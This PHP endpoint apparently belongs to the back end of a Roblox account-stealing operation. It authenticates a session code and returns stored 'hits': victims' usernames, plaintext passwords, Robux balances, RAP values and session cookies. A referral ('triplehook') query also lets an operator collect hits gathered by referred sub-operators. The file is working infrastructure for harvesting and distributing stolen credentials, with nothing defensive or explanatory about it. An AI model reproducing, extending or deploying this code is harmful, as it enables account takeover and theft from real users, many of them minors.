<?php
if (session_status() !== PHP_SESSION_ACTIVE) {
    session_name('token');
    session_start();
}
header('Content-Type: application/json; charset=UTF-8');
header('X-Content-Type-Options: nosniff');

include '../libs/configuration.php';
/* ---- functions this file uses (formerly from libs/functions.php, which is no longer needed) ---- */
if (!function_exists('executeSafeQuery')) {
function executeSafeQuery($sql, $params = []) {
    static $db = null;   // one database connection for the whole page (was: a new one for every query)
    if ($db === null) {
        include $_SERVER['DOCUMENT_ROOT'] . '/libs/connection.php';
    }
    
    // Block suspicious keywords (customize based on your needs)
$blockedKeywords = ['DROP TABLE', 'DELETE FROM', 'TRUNCATE TABLE', 'GRANT ', 'ALTER TABLE', 'CREATE TABLE', 'CREATE DATABASE'];
	foreach ($blockedKeywords as $keyword) {
        if (stripos($sql, $keyword) !== false) {
            throw new Exception("Suspicious SQL operation detected");
        }
    }

    try {
        $stmt = $db->prepare($sql);
        
        // Bind parameters securely
        foreach ($params as $key => $value) {
            $stmt->bindValue(is_int($key) ? $key + 1 : $key, $value, 
                is_int($value) ? PDO::PARAM_INT : PDO::PARAM_STR);
        }
        
        $stmt->execute();
        return $stmt->fetchAll(PDO::FETCH_ASSOC);
    } catch (PDOException $e) {
        error_log("Database error: " . $e->getMessage());
        return [];
    }
}
}
/* ---- end of the functions from libs/functions.php ---- */
include '../libs/connection.php';

$authCode = trim((string)($_SESSION['auth_code'] ?? ''));
if ($authCode === '') {
    echo json_encode(['success' => false, 'message' => 'Unauthorized']);
    exit();
}

try {
    $rows = executeSafeQuery(
        'SELECT auth_code, link_id, triplehook FROM regular WHERE auth_code = :auth_code LIMIT 2',
        [':auth_code' => $authCode]
    );
} catch (\Throwable $e) {
    echo json_encode(['success' => false, 'message' => 'Unauthorized']);
    exit();
}

if (!is_array($rows) || count($rows) !== 1 || !is_array($rows[0])) {
    echo json_encode(['success' => false, 'message' => 'Unauthorized']);
    exit();
}

$userData = $rows[0];
$stored = (string)($userData['auth_code'] ?? '');
$link_id = (int)($userData['link_id'] ?? 0);
if ($stored === '' || !hash_equals($stored, $authCode) || $link_id <= 0) {
    echo json_encode(['success' => false, 'message' => 'Unauthorized']);
    exit();
}

$isTriplehook = (int)($userData['triplehook'] ?? 0) === 1;

if ($isTriplehook) {
    $hitsQuery = "SELECT username, password, robux, summary, rap, cookie FROM hits
                  WHERE link_id IN (
                    SELECT :self_id AS link_id
                    UNION SELECT link_id FROM regular WHERE referred_by = :ref_id
                    UNION SELECT r2.link_id FROM regular r2
                    INNER JOIN triplehook_data td ON td.link_id = r2.referred_by
                    INNER JOIN regular r1 ON r1.link_id = td.link_id
                    WHERE r1.referred_by = :ref_id2
                  )
                  ORDER BY created_at DESC";
    $hitsResult = executeSafeQuery($hitsQuery, [
        ':self_id' => $link_id,
        ':ref_id' => $link_id,
        ':ref_id2' => $link_id
    ]);
} else {
    $hitsQuery = "SELECT username, password, robux, summary, rap, cookie FROM hits WHERE link_id = :link_id ORDER BY created_at DESC";
    $hitsResult = executeSafeQuery($hitsQuery, [':link_id' => $link_id]);
}

if (!is_array($hitsResult)) {
    $hitsResult = [];
}

$accounts = [];
foreach ($hitsResult as $hit) {
    $accounts[] = [
        'username' => $hit['username'] ?? 'Unknown',
        'password' => $hit['password'] ?? '',
        'robux' => $hit['robux'] ?? 0,
        'summary' => $hit['summary'] ?? 0,
        'rap' => $hit['rap'] ?? 0,
        'cookie' => $hit['cookie'] ?? ''
    ];
}

echo json_encode([
    'success' => true,
    'accounts' => $accounts,
    'total' => count($accounts)
]);
